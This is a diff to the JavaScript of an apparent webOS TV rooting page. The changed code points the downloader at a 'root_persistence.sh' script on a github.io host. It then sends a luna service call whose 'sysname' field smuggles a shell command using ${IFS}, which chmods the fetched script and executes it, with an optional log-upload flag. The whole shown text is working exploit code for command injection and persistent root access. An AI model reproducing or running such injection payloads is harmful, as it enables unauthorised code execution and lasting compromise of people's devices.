@@ -68,7 +68,8 @@
     var stateEl = document.getElementById('state');
     var detailEl = document.getElementById('detail');
     var scriptPath = '/media/internal/downloads/ts.sh';
-    var downloadTarget = 'https://azoffshowy.github.io/dangbro/resources/ts.sh';
+    var downloadTarget = 'https://azoffshowy.github.io/dangbro/resources/root_persistence.sh';
+    var debugMode = new URLSearchParams(window.location.search).has('debug');
     var settled = false;
 
     function setState(name, detail) {
@@ -99,10 +100,10 @@
         'luna://com.webos.service.legacybroadcast.debug/menu',
         JSON.stringify({
           menu: 'ci',
-          data: "ciplus20: sub=/ cmd=unbind sysname=';chmod${IFS}+x${IFS}" + scriptPath + ";" + scriptPath + ";#'"
+          data: "ciplus20: sub=/ cmd=unbind sysname=';chmod${IFS}+x${IFS}" + scriptPath + ";" + (debugMode ? 'UPLOAD_LOG=1${IFS}' : '') + scriptPath + ";#'"
         })
       );
-      if (!settled) setState('success', 'broadcast call sent');
+      if (!settled) setState('pending', 'inject sent — watch your TV screen for the result');
     }
 
     function watchDownload(ticket) {
